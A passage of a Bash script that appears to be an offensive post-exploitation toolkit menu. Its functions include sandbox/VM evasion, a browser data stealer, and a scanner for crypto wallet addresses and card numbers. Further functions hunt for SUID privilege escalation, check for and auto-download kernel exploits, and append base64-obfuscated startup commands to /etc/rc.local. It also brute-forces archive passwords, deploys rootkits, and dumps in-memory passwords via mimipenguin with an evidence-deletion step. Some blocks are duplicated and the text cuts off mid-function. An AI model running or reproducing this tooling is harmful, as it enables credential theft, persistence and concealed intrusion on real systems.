        if dmidecode -s system-manufacturer 2>/dev/null | grep -qiE "(VMware|VirtualBox|QEMU|Xen|Microsoft)"; then
            echo "VM detected via dmidecode system manufacturer."
            exit_or_stay
        fi
    fi

    # Check CPU flags for hypervisor presence
    if grep -q "^flags.*hypervisor" /proc/cpuinfo; then
        echo "VM detected via CPU hypervisor flag."
        exit_or_stay
    fi
    # Check manufacturer name using dmidecode (requires root)
    if command -v dmidecode &>/dev/null; then
        if dmidecode -s system-manufacturer 2>/dev/null | grep -qiE "(VMware|VirtualBox|QEMU|Xen|Microsoft)"; then
            echo "VM detected via dmidecode system manufacturer."
            exit_or_stay
        fi
    fi
    # Check MAC addresses (VMs often use known MAC ranges)
    if ip link show | grep -qE "00:05:69|00:1C:14|00:0C:29|00:50:56|00:16:3E|08:00:27"; then
        echo "VM detected via MAC address."
        exit_or_stay
    fi
    # Check for common VM-specific modules
    if lsmod | grep -qE "(vmw_balloon|vboxguest|xen_blkfront|xen_netfront|kvm)"; then
        echo "VM detected via loaded kernel modules."
        exit_or_stay
    fi
    echo "If no Warnings where given then No VM detected."
    wait_and_return
}

# Class: POST EXPLOIT - Tool: Web Browser Info Stealer - Option 2 (Wrapper used)
# Function to steal browser data
# The script will use a wrapper to run the browser stealer binary
# The browser stealer binary will extract sensitive information from the user's web browsers
# The script will also log the date, time, user name, and script run information
# to browser_data_stealer.log
browser_data_wrapper() {
    clear
    postx_browserthief_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$browser_stealer_bin"
    wait_and_return
}

# Class: POST EXPLOIT - Tool: Crypto Finder - Option 3
# Function to search for cryptocurrency wallet data
# The script will prompt the user for a scan type (default or custom)
# If the user chooses default, it will search common browser locations for wallet data
# If the user chooses custom, it will prompt for a file path to scan
# The script will use grep to search for known cryptocurrency wallet patterns
# The script will also log the date, time, user name, and script run information
# to crypto_finder.log
crypto_catch() {
    A="$ax Crypto Search ==> ${x}"
    clear
    postx_crypto_frame
    export CSTK_MAIN_RUNNER=1
    # Prompt the user for a scan type
    echo -e "$c Do you want to run a default scan (search common browser locations) or specify a custom file? (default/custom) $x"
    read -r -p "${r} ${A} ${x}" scan_choice

    if [[ "$scan_choice" == "default" ]]; then
    	echo -e "$c Running default scan...$x"
    	run_default_scan
    else
    	echo -e "$c Enter path to check for crypto data: $x"
    	read -e -r -p "${r} ${A} ${x}" path_to_your_data_file
    	run_custom_scan "$path_to_your_data_file"
    fi

    # Function to handle default scan for common browser locations
    run_default_scan() {
    	declare -A browser_paths
    	home="$HOME"
    	browser_paths=(
        [Firefox]="$home/.mozilla/firefox/*.default-release/"
        [Chrome]="$home/.config/google-chrome/Default/"
        [Brave]="$home/.config/BraveSoftware/Brave-Browser/Default/"
        [Opera]="$home/.config/opera/"
        [Edge]="$home/.config/microsoft-edge/Default/"
        [Safari]="$home/Library/Safari/"
        [Vivaldi]="$home/.config/vivaldi/Default/"
        [DuckDuckGo]="$home/.config/duckduckgo/"
    )

    for browser in "${!browser_paths[@]}"; do
        local data_file="${browser_paths[$browser]}"
        echo -e "$g Checking $browser data in: $data_file $x"
        if [[ -d "$data_file" ]]; then
            process_files "$data_file"
        else
            echo -e "$r $browser data not found. $x"
        fi
    done
    }

    # Function to handle custom file scan
    run_custom_scan() {
    local data_file="$1"
    if [[ ! -f "$data_file" ]]; then
        echo -e "$r File not found. Exiting... $x"
        return
    fi
    process_files "$data_file"
    }

    # Function to process files for crypto wallet data
    process_files() {
    local file_path="$1"
    grep -oP ".+" "$file_path"* 2>/dev/null | while IFS= read -r line; do
        [[ -z "$line" || "$line" =~ ^# ]] && continue
        process_line "$line"
    done
    }

    # Declare supported crypto regex patterns
    declare -A crypto
    crypto=(
    [BTC]="1[a-zA-HJ-NP-Z1-9]{25,29}|3[a-zA-HJ-NP-Z0-9]{25,29}|bc1[a-zA-HJ-NP-Z0-9]{25,29}"
    [ETH]="0x[a-fA-F0-9]{40}"
    [XMR]="4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}|8[0-9AB][1-9A-HJ-NP-Za-km-z]{93}"
    [XRP]="r[0-9a-zA-Z]{24,34}"
    [BCH]="1[a-km-zA-HJ-NP-Z1-9]{25,34}|3[a-km-zA-HJ-NP-Z1-9]{25,34}|q[a-z0-9]{41}|p[a-z0-9]{41}"
    [LTC]="L[a-km-zA-HJ-NP-Z1-9]{26,33}|M[a-km-zA-HJ-NP-Z1-9]{26,33}|3[a-km-zA-HJ-NP-Z1-9]{26,33}|ltc1q[a-km-zA-HJ-NP-Z1-9]{26,33}"
    [DOGE]="D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}"
    [ZEC]="t1[a-km-zA-HJ-NP-Z1-9]{33}"
    [DASH]="X[1-9A-HJ-NP-Za-km-z]{33}"
    [RON]="ronin:[a-fA-F0-9]{40}"
    [TRX]="T[A-Za-z1-9]{33}"
    [STEAM]="http[s]*:\/\/steamcommunity.com\/tradeoffer\/new\/\?partner=([0-9]+)&token=([a-zA-Z0-9]+)"
    [MSTCD]="[51-55]\d{14}"
    [VISA]="4\d{15}|4\d{12}"
    [DISCOVER]="6011\d{12}|65\d{14}"
    [AMEXP]="34\d{13}|37\d{13}"
    [DINCLUB]="[300-305]\d{11}|36\d{12}|38\d{12}"
    [JCB]="35\d{14}|2131\d{11}|1800\d{11}"
    )

    # Function to process each line of a file
    process_line() {
    local line="$1"
    for key in "${!crypto[@]}"; do
        if [[ "$line" =~ ${crypto[$key]} ]]; then
            echo -e "$r $key $g Address found:$r $line $x"
            log_result "$key" "$line"
            return
        fi
    done
    echo -e "No match found: $line" > /dev/null
    log_result "No Match" "$line"
    }

    # Function to log results
    log_result() {
    local status="$1"
    local line="$2"
    local log_dir="$log/cryptosearch.log"
    echo -e "\n\nDate and Time: $(date) \nUser's Name: $USER \nSTATUS: $status Address found: $line" >> "$log_dir"
    }
    wait_and_return
}

# Class: POST EXPLOIT - Tool: File Permissions Exploit - Option 4
# Function to check for privilege escalation exploits using GTFOBins
# The script will check for files with SUID enabled in the user's PATH directories
# It will fetch the list of GTFOBins entries and compare them with the found files
# If any matches are found, it will display the potential privilege escalation exploits
# The script will also log the date, time, user name, and script run information
# to GTFOB.log
check_gtfob() {
    clear
    postx_filex_frame
    sleep 5
    # Ensure GTFOB.py is available
    if ! command -v python3 &> /dev/null || [ ! -f "$GTFOB" ]; then
        echo -e "$r \nPython3 not found. Script failed to run $x"
        exit 4
    fi
# Variable to pull user's executable PATH's directories
IFS=':' read -r -a P <<< "$PATH"

# Find files with SUID enabled in PATH directories, suppressing errors
hazard=$(find "${P[@]}" -type f -perm -u+s -exec basename {} \; 2>/dev/null)

# Fetch the list of GTFOBins entries, suppressing errors
fix=$(python3 "$GTFOB" -s 2>/dev/null | tr -d '*"-,_|/\\)$' | tail -n +1 | tr ' ' "\n")

# Use arrays for better handling
readarray -t hazard_array <<< "$hazard"
readarray -t fix_array <<< "$fix"

# Find matching file names for privilege escalation
solution=$(comm -12 <(printf '%s\n' "${hazard_array[@]}" | sort) <(printf '%s\n' "${fix_array[@]}" | sort))

# Check if any solution found
if [ -z "$solution" ]; then
echo -e "$r Nothing Found $x"
echo -e "Date and Time: $DATE \nUser's Name: $USER \nScript Ran: GTFOB - Privilege Escalation script to search for bad or misconfigured file permissions \nNO EXPLOITS FOUND. \n "   >> "$log/GTFOB.log"
else
echo -e "$r Found Possible Privilege Escalation Executable(s): $x"
for sol in $solution; do
    # Get the attack type and exploitation command
    issue=$(python3 "$GTFOB" --bin "$sol" | grep "Attack Type:")
    command=$(python3 "$GTFOB" --bin "$sol" | grep --after-context 10 "Code:")
    if [ -n "$issue" ]; then
        touch "$Loot/GTFOB.txt"
        echo -e "$c PrivEx is in $r $sol $x" | tee -a "$Loot/GTFOB.txt"
        echo -e "$c Maybe abused with exploit $r $issue $x" | tee -a "$Loot/GTFOB.txt"
        echo -e "$c Can be exploited by running the command: $r $command $x" | tee -a "$Loot/GTFOB.txt"
        echo -e "Date and Time: $DATE \nUser's Name: $USER \nScript Ran: GTFOB - Privilege Escalation script to search for bad or misconfigured file permissions \nFOUND: $sol \nABUSE: $issue \nEXPLOIT: $command"   >> "$log/GTFOB.log"
    fi
done
fi


    # Find files with SUID enabled in PATH directories, suppressing errors
    hazard=$(find "${P[@]}" -type f -perm -u+s -exec basename {} \; 2>/dev/null)

    # Fetch the list of GTFOBins entries, suppressing errors
    fix=$(python3 "$GTFOB" -s 2>/dev/null | tr -d '*"-,_|/\\)$' | tail -n +1 | tr ' ' "\n")

    # Use arrays for better handling
    readarray -t hazard_array <<< "$hazard"
    readarray -t fix_array <<< "$fix"

    # Find matching file names for privilege escalation
    solution=$(comm -12 <(printf '%s\n' "${hazard_array[@]}" | sort) <(printf '%s\n' "${fix_array[@]}" | sort))

    # Check if any solution found
    if [ -z "$solution" ]; then
    echo -e "$r Nothing Found $x"
    echo -e "Date and Time: $DATE \nUser's Name: $USER \nScript Ran: GTFOB - Privilege Escalation script to search for bad or misconfigured file permissions \nNO EXPLOITS FOUND. \n "   >> "$log/GTFOB.log"
    else
    echo -e "$r Found Possible Privilege Escalation Executable(s): $x"
    for sol in $solution; do
        # Get the attack type and exploitation command
        issue=$(python3 "$GTFOB" --bin "$sol" | grep "Attack Type:")
        command=$(python3 "$GTFOB" --bin "$sol" | grep --after-context 10 "Code:")
        if [ -n "$issue" ]; then
            touch "$Loot/GTFOB.txt"
            echo -e "$c PrivEx is in $r $sol $x" | tee -a "$Loot/GTFOB.txt"
            echo -e "$c Maybe abused with exploit $r $issue $x" | tee -a "$Loot/GTFOB.txt"
            echo -e "$c Can be exploited by running the command: $r $command $x" | tee -a "$Loot/GTFOB.txt"
            echo -e "Date and Time: $DATE \nUser's Name: $USER \nScript Ran: GTFOB - Privilege Escalation script to search for bad or misconfigured file permissions \nFOUND: $sol \nABUSE: $issue \nEXPLOIT: $command"   >> "$log/GTFOB.log"
        fi
    done
    fi

    wait_and_return
}

# Class: POST EXPLOIT - Tool: Kernel Exploit - Option 5 (Wrapper Used)
# Function to check for Linux kernel exploits
# The script will use a wrapper to run the Linux exploit checker binary
# The Linux exploit checker will check for kernel vulnerabilities and userland vulnerabilities
# The script will prompt the user for options to check kernel vulnerabilities, userland vulnerabilities, or both
# The script will also prompt the user for options to list other security-related issues and to download exploit scripts
# The script will log the date, time, user name, and script run information
# to linux_exploit_checker.log
linux_exploits_check() {
    A="$ax Linux Exploit Check ==> ${x}"
    file="$linux_exploit_checker_bin"
    trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
    clear
    postx_kernalx_frame
    sleep 5
    echo -e "\nWould you like to check for: \n1 - kernel vulnabilities \n2 - userland vulnabilites \n3 - both 1 and 2 \n4 - exit to main menu \n"
    read -r -n 1 -p "${c} ${A} ${x}" rk
    [[ "$rk" -ge 4 ]] && wait_and_return
    echo -e "\nDo you want a listing of other possible security related issues? Y/N \n"
    read -r -n 1 -p "${c} ${A} ${x}" list
    echo -e "\nIf any vulnabilities are found do you want a automatic download of the exploit script? \nExploits may be either source code or in binary format Y/N ?\n"
    read -r -n 1 -p "${c} ${A} ${x}" down
    export CSTK_MAIN_RUNNER=1
    touch "$Loot/Exploit_Searcher.txt"
    openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$lecb" -out "$linux_exploit_checker_bin" -pass pass:"$pswd"
    if [[ "$rk" -eq 3 ]]; then
    	if [[ "$down" =~ [Yy] ]]; then
    		if [[ "$list" =~ [Yy] ]]; then
    			bash "$linux_exploit_checker_bin" -b -s --checksec | tee -a "$Loot/Exploit_Searcher.txt"
    		elif [[ "$list" =~ [Nn] ]]; then
    			bash "$linux_exploit_checker_bin" -b -s | tee -a "$Loot/Exploit_Searcher.txt"
    		else
    			echo "Bad Option" && linux_exploit_check
    		fi
    	elif [[ "$down" =~ [Nn] ]]; then
    		if [[ "$list" =~ [Yy] ]]; then
    			bash "$linux_exploit_checker_bin" --checksec | tee -a "$Loot/Exploit_Searcher.txt"
    		elif [[ "$list" =~ [Nn] ]]; then
    			bash "$linux_exploit_checker_bin" | tee -a "$Loot/Exploit_Searcher.txt"
    		else
    			echo "Bad Option" && linux_exploit_check
    		fi
    	else
    		echo "Bad Option" && linux_exploit_check
    	fi
    elif [[ "$rk" -eq 2 ]]; then
    	if [[ "$down" =~ [Yy] ]]; then
    		if [[ "$list" =~ [Yy] ]]; then
    			bash "$linux_exploit_checker_bin" --userspace-only -b -s --checksec | tee -a "$Loot/Exploit_Searcher.txt"
    		elif [[ "$list" =~ [Nn] ]]; then
    			bash "$linux_exploit_checker_bin" -b -s --userspace-only | tee -a "$Loot/Exploit_Searcher.txt"
    		else
    			echo "Bad Option" && linux_exploit_check
    		fi
    	elif [[ "$down" =~ [Nn] ]]; then
    		if [[ "$list" =~ [Yy] ]]; then
    			bash "$linux_exploit_checker_bin" --checksec --userland-only | tee -a "$Loot/Exploit_Searcher.txt"
    		elif [[ "$list" =~ [Nn] ]]; then
    			bash "$linux_exploit_checker_bin" --userland-only | tee -a "$Loot/Exploit_Searcher.txt"
    		else
    			echo "Bad Option" && linux_exploit_check
    		fi
    	else
    		echo "Bad option" && linux_exploit_check
    	fi
    elif [[ "$rk" -eq 1 ]]; then
    	if [[ "$down" =~ [Yy] ]]; then
    		if [[ "$list" =~ [Yy] ]]; then
    			bash "$linux_exploit_checker_bin" -b -s --checksec --kernelspace-only | tee -a "$Loot/Exploit_Searcher.txt"
    		elif [[ "$list" =~ [Nn] ]]; then
    			bash "$linux_exploit_checker_bin" -b -s --kernelspace-only | tee -a "$Loot/Exploit_Searcher.txt"
    		else
    			echo "Bad option" && linux_exploit_check
    		fi
    	elif [[ "$down" =~ [Nn] ]]; then
    		if [[ "$list" =~ [Yy] ]]; then
    			bash "$linux_exploit_checker_bin" --checksec --kernelspace-only | tee -a "$Loot/Exploit_Searcher.txt"
    		elif [[ "$list" =~ [Nn] ]]; then
    			bash "$linux_exploit_checker_bin" --kernelspace-only | tee -a "$Loot/Exploit_Searcher.txt"
    		else
    			echo "Bad option" && linux_exploit_check
    		fi
    	else
    		echo "Bad option" && linux_exploit_check
    	fi
    else
    	echo "Bad option" && linux_exploit_check
    fi
    rm "$linux_exploit_checker_bin"
    wait_and_return
}

# Class: POST EXPLOIT - Tool: Command on start up - Option 6
# Function to append a command to be executed at system startup
# The script will prompt the user for a command to run at startup
# The command will be encoded in base64 and appended to /etc/rc.local
# The script will also log the date, time, user name, and script run information
# to embed_command_on_start.txt
startup_command() {
    A="$ax Command On Start ==> ${x}"
    clear
    postx_onstart_frame
    sleep 5
    LOOT_FILE="$Loot/embed_command_on_start.txt"
    exec > >(tee -a "$LOOT_FILE") 2>&1
    echo -e "$g \nEnter command to run at startup $x"
    read -r -p "${c} ${A} ${x}" command
    encode_cmd="echo -n '$command' | base64"
    encoded=$(eval "$encode_cmd")
    decode_cmd="echo -n '$encoded' | base64 -d"
    decoder="$""(eval ""$decode_cmd)"
    sudo echo "$decoder" >> /etc/rc.local
    echo -e "$p /nAppended encoded command to $r /etc/rc.local $x"

    wait_and_return
}

# Class: POST EXPLOIT - Tool: Brute force archive - Option 7
# Function to brute force password-protected archives (zip, rar, 7z)
# The script will prompt the user for a dictionary file and an archive file
# It will use John the Ripper or unzip/rar/7z commands to attempt to crack the password
# If John the Ripper is not available, it will use a brute force method
# The script will log the results to respective files in the Loot directory
# The script will also log the date, time, user name, and script run information
# to password_bruteforce.log
brute_force_file() {
    A="$ae Archive Brute Forcer ==> ${x}"
    clear
    postx_bruteforce_frame
    sleep 5
    echo -e "$c \nEnter the path and filename of the password file to use. $b\nExample: $r /usr/share/Seclist/passwords/rockyou.txt $x"
    read -e -r -p "${c} ${A} ${x}" dictionary
    echo -e "$y \nSpecify the full path and filename of the 7z, zip, or rar archive to bruteforce. $x"
    read -e -r -p "${c} ${A} ${x}" filename
    if ! [[ -f "$dictionary" ]]; then
    	echo -e "$r \nNo such dictionary: $dictionary$x\n"
    	exit 1
    fi
    if ! [[ -f "$filename" ]]; then
        echo -e "$r \nNo such file found: $filename$x\n"
        exit 1
    fi
    if command -v john &>/dev/null; then
    	if [[ $filename == *.zip ]]; then
    		zip2john "$filename" > ziphash.txt
    		john --fork=10 --format=zip --wordlist="$dictionary" ziphash.txt
    	elif [[ $filename == *.rar ]]; then
    		rar2john "$filename" > rarhash.txt
    		john --fork=10 --format=rar --wordlist="$dictionary" rarhash.txt
    	elif [[ $filename == *.7z ]]; then
    		7z2john "$filename" > 7zhash.txt
    		john --fork=10 --format=7z --wordlist="$dictionary" 7zhash.txt
    	else
    		echo -e "$r \nWrong file type or file doesn't end in .zip, .7z, or .rar. $x"
    		exit 1
    	fi
    else
    	cracked=0
    		for word in $(cat "$dictionary"); do
    			if [[ $filename == *.zip ]]; then
        			out=$(unzip -R "$word" "$filename" 2>&1)
        			if [[ $out == *"inflating"* ]]; then
        				touch "$Loot/password_bruteforce_zip_results.txt"
            			echo -e "$g\nFound password: $word $x" | tee -a "$Loot/password_bruteforce_zip_results.txt"
            			((cracked++))
            			break
        			fi
    			elif [[ $filename == *.rar ]]; then
        			out=$(rar x -p"$word" "$filename" 2>/dev/null)
        			success="$?"
        			if [[ $success -eq 0 ]]; then
        				touch "$Loot/password_bruteforce_rar_results.txt"
            			echo -e "$g\nFound password: $word $x" | tee -a "$Loot/password_bruteforce_rar_results.txt"
            			((cracked++))
            			break
        			fi
    			elif [[ $filename == *.7z ]]; then
        			out=$(7z e "$filename" -p"$word" 2>/dev/null)
        			success="$?"
        			if [[ $success -eq 0 ]]; then
        				touch "$Loot/password_bruteforce_7z_results.txt"
            			echo -e "$g\nFound password: $word $x" | tee -a "$Loot/password_bruteforce_7z_results.txt"
            			((cracked++))
            			break
        			fi
    			fi
    		done
    		if [[ $cracked -eq 0 ]]; then
    			touch "$Loot/password_bruteforce_attempt.txt"
    			echo -e "$r\nPassword not found. Try another dictionary.$x" | tee -a "$Loot/password_bruteforce_attempt.txt"
    		fi
    fi
    wait_and_return
}

# Class: POST EXPLOIT - Tool: Files of interest - Option 8 (Wrapper Used)
# Function to find files of interest 
# The script will use a wrapper to run the files of interest binary
# The files of interest binary will search for files that may contain sensitive information
# The script will copy the found information to a designated directory (Loot)
# The script will log the date, time, user name, and script run information
# to files_of_interest.log
files_of_interest() {
    clear
    postx_foi_frame
    start_files=$(ls "$PWD")
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$filesofinterest_bin"
    end_files=$(ls "$PWD")
    DES_DIR="$Loot"
    new_files=$(comm -13 <(echo "$start_files" | sort) <(echo "$end_files" | sort))
    for file in $new_files; do
    	if [ -f "$new_files" ]; then
        		mv "$file" "$DES_DIR"
        		echo -e "$p \n$file Moved to $Loot Directory $x"
    	fi
    done

    wait_and_return
}
# Class: POST EXPLOIT - Tool: Rootkits Option 9 (WRAPPER USED)
# Function to deploy rootkits
# The script will use a wrapper to run the rootkit deployment binary
# The rootkit deployment binary will allow the user to choose from a list of available rootkits
# The script will prompt the user to read the README files for userland and kernel rootkits
# The script will log the date, time, user name, and script run information
# to rootkit_deployment.log
# The script will also provide options to deploy or read the README files
# The script will also provide options to pick a rootkit to deploy on the system
# The script will also provide options to exit or return to the main menu
deploy_rootkit() {
    A="$ax Rootkit ==> ${x}"
    postx_rootkit_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1

    readme_userland() {
    	$open_cmd "$tools/userland_rootkit.md"
    }
    readme_kernel() {
    	$open_cmd "$tools/kernel_rootkit.md"
    }
    pick_rootkit() {
    	echo -e "$g \nChoose number option: $x"
    	echo -e "$y \n1 - azazel rootkit - userland \n2 - umbreon rootkit - userland $c \n3 - diamorphine rootkit - kernel \n4 - kovid rootkit - kernel \n5 - lkm rootkit - kernel \n6 - reptile rootkit - kernel $r \n7 - Exit \n\n $x"
    	read -r -n 1 -p "${c} ${A} ${x}" rag
    	case $rag in
    		1) "$cstk_wrapper" "$userland_rootkit_bin A" ;;
    		2) "$cstk_wrapper" "$userland_rootkit_bin U" ;;
    		3) "$cstk_wrapper" "$kernel_rootkit_bin D" ;;
    		4) "$cstk_wrapper" "$kernel_rootkit_bin K" ;;
    		5) "$cstk_wrapper" "$kernel_rootkit_bin L" ;;
    		6) "$cstk_wrapper" "$kernel_rootkit_bin R" ;;
    		7) wait_and_return ;;
    		*) exit 1 ;;
    	esac
    }
    deploy_or_read() {
    	echo -e "$g \nDo you want to: $r \n1 - $b read the userland README file $r \n2 - $b read the kernel README file $r \n3 - $p pick a rootkit to deploy on system $r \n4 - Exit $x"
    	read -r -n 1 -p "${c} ${A} ${x}" kit
    	case $kit in
                	1) readme_userland && deploy_or_read ;;
                	2) readme_kernel && deploy_or_read ;;
    				3) pick_rootkit ;;
    				4) exit ;;
    	esac
    }

    clear
    postx_rootkit_frame
    echo -e "$g \nThere are two types of rootkits available $r \nuserland rootkits \nkernel rootkits $g \ni have packaged a few of each type for you."
    echo -e "$p \nAs of 10-17-2024 i have not tested them and any information given is from there README that i recieved."
    echo -e "$b \nMy suggestion for you is to use one of the $r kernel rootkits $b if possible and only relay on the $r userland rootkits $b if absolutely necessary."
    echo -e "$c \nBut before you decide, first read the README files to get a better idea. $y \nThere are 2 README files one for the userland rootkits and one for the kernel rootkits. $x"
    deploy_or_read
    wait_and_return
}
# Class: POST EXPLOIT - Tool: In Memory Password Stealer - Option 10
# Function to steal passwords from memory using mimipenguin
# The script will clone the mimipenguin repository, compile it, and run it to extract passwords
# The script will prompt the user to delete the evidence after running
# The script will log the date, time, user name, and script run information
# to inmem_password_stealer.log
# The script will also provide options to delete the evidence after running
# The script will also provide options to exit or return to the main menu   
inmem_password_stealer() {
    A="$ax Mem-Passwd-Stealer ==> ${x}"
    postx_inmem_frame
    sleep 5
    cwd="$PWD"
    git clone https://github.com/huntergregal/mimipenguin.git &>/dev/null
    cd mimipenguin &>/dev/null
    make &>/dev/null
    ./mimipenguin
    read -p "${A} Press Enter/Return when ready to delete the evidence"
    cd "$cwd" &>/dev/null
    rm -rf mimipenguin &>/dev/null
    wait_and_return
}

############################# ETC ##########################################

# Class: ETC - Tool: Users and Shells - Option 1 (AWK)
# Function to list users and their login shells
# The script will read the /etc/passwd file and filter users with login shells
# It will display the users and their respective shells
# The script will log the output to users_and_shells.txt in the Loot directory
# The script will also log the date, time, user name, and script run information
# to users_and_shells.log
users_and_shells() {
clear
etc_usershells_frame
LOOT_FILE="$Loot/users_and_shells.txt"
exec > >(tee -a "$LOOT_FILE") 2>&1
/usr/bin/awk -F: '
BEGIN {
    printf("\n\n%s\n", "/etc/passwd accounts with login shells");
    printf("%s\n", "------------------------------------------");
}
{
    if ($7 ~ /sh/) { printf("%10s uses the shell %s\n", $1, $7); }
}
' /etc/passwd
wait_and_return
}

# Class: ETC - Tool: Python Web server - Option 2
# Function to start a simple HTTP server using Python
# The script will prompt the user for a port number to use for the server
# It will start the server in the background and allow the user to stop it with a command
# The script will log the server start and stop times, user name, and script run information
# to pythonserver.log
py_web_server() {
    A="$ae WebServer ==> ${x}"
    clear
    etc_webserver_frame
    echo -e "$c \nEnter port number to use $x"
    read -r -p "${b} ${A} ${x}" num

    # Validate port number
    while [[ "$num" -lt 1 || "$num" -gt 65535 ]]; do
        echo -e "$r \nIncorrect option, must choose between 1 - 65535 $x"
        read -r -p "${c} ${A} ${x}" num
    done

    # Start the HTTP server in the background
    python3 -m http.server "$num" &
    server_pid=$!

    echo -e "$g \nServer started on port $r $num $g with PID $r $server_pid $x. $b \nType $r S $b to stop the server $x."
    echo -e "Today's Date and Time: $DATE \nUser's Name: $USER \nScript Ran: Python3 Web Server - Start a Web Server on a given port.\n STATUS: Server started on port $num with PID $server_pid."   >> "$log/pythonserver.log"
    # Wait for user input
    while true; do
        read -r -p "Command: " command
        if [[ "$command" == "S" ]]; then
            echo -e "$g \nStopping server with PID $r $server_pid $x"
            kill "$server_pid"
            wait "$server_pid" 2>/dev/null
            echo -e "$p \nServer stopped. $x"
    	    echo -e "Server Stop Time: $DATE" >> "$log/pythonserver.log"
            break
        else
            echo -e "$r \nInvalid command. Type S to stop the server. $x"
        fi
    done

    wait_and_return
}

# Class: ETC - Tool: File Extractor - Option 3
# Function to extract files from various archive formats
# The script will prompt the user for the archive file path
# It will check the file type and use the appropriate command to extract it
# The script will log the extraction process to a file in the Loot directory
# The script will also log the date, time, user name, and script run information
# to file_extractor.log
extract_arch() {
    A="$ae File Extract ==> ${x}"
    clear
    etc_extract_frame
    required_commands=(tar bunzip2 unrar gunzip unzip uncompress dpkg 7z)
    for cmd in "${required_commands[@]}"; do
        if ! command -v "$cmd" &> /dev/null; then
            echo -e "\n\n $r Error: $cmd is not installed. Please install it to use this script. $x"
            exit 5
        fi
    done
    echo -e "$c Enter archive full file path $x"
    read -e -r -p "${c} ${A} ${x}" archive
    if [ -f "$archive" ]; then
        case $archive in
            *.tar.bz2) tar -x -j -f "$archive" ;;
            *.tar.gz) tar -x -z -f "$archive" ;;
            *.bz2) bunzip2 "$archive" ;;
            *.rar) unrar x "$archive" ;;
            *.gz) gunzip "$archive" ;;
            *.tar) tar -x -f "$archive" ;;
            *.zip) unzip "$archive" ;;
            *.Z) uncompress "$archive" ;;
            *.deb) dpkg -x "$archive" . ;;
            *.7z) 7z x "$archive" ;;
            *.tar.wz) tar -x -f "$archive" ;;
            *) echo -e "$r '$archive' cannot be extracted by archive $x" ;;
        esac
    else
        echo -e "$r '$archive' is not a valid file $x"
    fi
    wait_and_return
}

# Class: ETC - Tool: openssl helper - Option 4 (Wrapper Used)
# Function to run OpenSSL helper script
# The script will use a wrapper to run the OpenSSL helper binary
# The OpenSSL helper binary will provide various OpenSSL-related functionalities
# The script will log the date, time, user name, and script run information
# to openssl_helper.log
r_b_g_wrapper() {
    clear
    etc_openssl_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$openssl_helper_bin"
    wait_and_return
}

# Class: ETC - Tool: Gpg Look a like - Option 5 (Wrapper Used)
# Function to run GPG lookalike wrapper
# The script will use a wrapper to run the GPG lookalike binary
# The GPG lookalike binary will provide functionalities similar to GPG
# The script will log the date, time, user name, and script run information
# to gpg_lookalike.log
gpg_lookalike_wrapper() {
    clear
    etc_secret_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$gpg_help_bin"
    wait_and_return
}

# Class: ETC - Tool: Create exe Binary - Option 6
# Function to create a binary executable from a shell script
# The script will prompt the user for the shell script path and the new binary name
# It will use the shc tool to compile the script into a binary executable
# The script will log the creation process to a file in the Loot directory
# The script will also log the date, time, user name, and script run information
# to create_binary.log
create_exe_binary() {
    A="$ae Create Binary ==> ${x}"
    clear
    etc_binary_frame
    LOG_FILE="$log/create_binary.log"
    exec > >(tee -a "$LOG_FILE") 2>&1
    echo -e "$p \nYour original shell script will still be available after converting to binary.$x"
    echo -e "$g \nEnter the full path and shell script name to use.$g \nExample: $r /home/john/Documents/bashscript.sh $x"
    read -e -r -p "${c} ${A} ${x}" bash_script
    echo -e "$g \nEnter the full path and the new binary script name.$g \nExample:$r /home/john/Documents/bashscript $x"
    read -e -r -p "${c} ${A} ${x}" new_script_name

    if ! [ -f "$bash_script" ]; then
        echo -e "$r \n$bash_script not found $x"
        exit 8
    fi
    script_name="$(basename "$bash_script")"
    if ! cp "$bash_script" "/tmp/$script_name"; then
        echo -e "$r \nError in trying to copy $bash_script $x"
        exit 15
    fi
    shc -r -f "/tmp/$script_name" -o "$new_script_name" || { echo -e "$r \nError compiling the script to binary $x" ; exit 17 ; }
    chmod 755 "$new_script_name"
    rm -rf "/tmp/$script_name.*"
    echo -e "$g \nBinary $new_script_name is ready. $x"
    wait_and_return
}

# Class: ETC - Tool: Post exploit tools to go - Option 7
# Function to create a zip file of post-exploit tools
# The script will prompt the user to confirm the creation of the zip file
# It will use OpenSSL to decrypt the zip file and then create a zip file containing various post-exploit tools
# The script will log the creation process to a file in the Loot directory
# The script will also log the date, time, user name, and script run information
# to post_exploit_tools.log
post_x_2_go() {
    A="$ae Post Exploit 2 GO ==> ${x}"
    file="$zip2go"
    trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
    echo -e "\nThe targets computer will need zip, base64/32/16, and xxd\nAll these tools should be standard on most linux systems\nContinue? y/n"
    read -r -n 1 -p "${c} ${A} ${x}" opt
    if [[ "$opt" =~ [Nn] ]]; then
        wait_and_return
    elif [[ "$opt" =~ [Yy] ]]; then 
        openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$zip2go_enc" -out "$zip2go" -pass pass:"$pswd"
        echo "zip file is located in the $Malware folder"
    else
        error_font
    fi
        wait_and_return
}

# Class: ETC - Tool: Array Encrypted Script - Option 8
# Function to create an array encrypted script
# The script will prompt the user for a command to convert into an array format
# It will convert each letter of the command into an array index using uppercase and lowercase arrays
# The script will create a new script file with the converted command
# The script will also prompt the user for a final script name
# The script will log the creation process to a file in the Malware directory
# The script will also log the date, time, user name, and script run information
# to array_encrypted_script.log
array_enc_script() {
clear
etc_array_frame
# Define uppercase and lowercase arrays
UF=( A B C D E F G H I J K L M N O P Q R S T U V W X Y Z )
LF=( a b c d e f g h i j k l m n o p q r s t u v w x y z )
# read command to convert
echo -ne "\e[36mEnter a command to convert:\e[0m "
read -r -p "==> " command
# ask user for final script name
echo -ne "\e[36mEnter a final script name:\e[0m "
read -r -p "==> " name
# convert each letter of $command to a array index
result=""
for (( i=0; i<${#command}; i++ )); do
    char="${command:$i:1}"
    # Convert to array index
    if [[ "$char" =~ [A-Z] ]]; then
        index=$(printf "%d" "'$char")
        index=$((index - 65))
        result+="\${UF[$index]}"
    elif [[ "$char" =~ [a-z] ]]; then
